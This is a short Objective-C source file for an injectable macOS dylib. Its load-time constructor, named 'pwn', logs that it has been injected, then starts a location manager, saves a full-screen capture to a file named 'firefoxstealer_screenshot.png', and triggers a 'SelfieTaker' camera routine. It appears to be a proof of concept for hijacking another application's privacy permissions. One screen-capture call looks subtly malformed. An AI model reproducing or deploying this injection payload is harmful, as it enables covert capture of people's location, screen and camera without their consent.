#import <Foundation/Foundation.h>
#import "LocationManager.h"
#import "SelfieTaker.h"

void takeScreenshot() {
    CGImageRef image = CGWindowListCreateImage(CGRectInfinite, kCGWindowListOptionAll, kCGWindowListOptionAll, kCGWindowImageDefault);
    CFURLRef url = CFURLCreateWithString(kCFAllocatorDefault, CFSTR("file:///tmp/firefoxstealer_screenshot.png"), NULL);
    CGImageDestinationRef destination = CGImageDestinationCreateWithURL(url, kUTTypePNG, 1, NULL);
    CGImageDestinationAddImage(destination, image, nil);
    CGImageDestinationFinalize(destination);
}

__attribute__((constructor)) static void pwn(int argc, const char **argv) {
    NSLog(@"[+] Dylib injected");
    
    [LocationManager new];
    takeScreenshot();
    SelfieTaker *selfieTaker = [SelfieTaker new];
    [selfieTaker stopTakingSelfie];

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 4 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        NSLog(@"[+] Finishing...");
        exit(0);
    });
    
    [[NSRunLoop mainRunLoop] run];
}
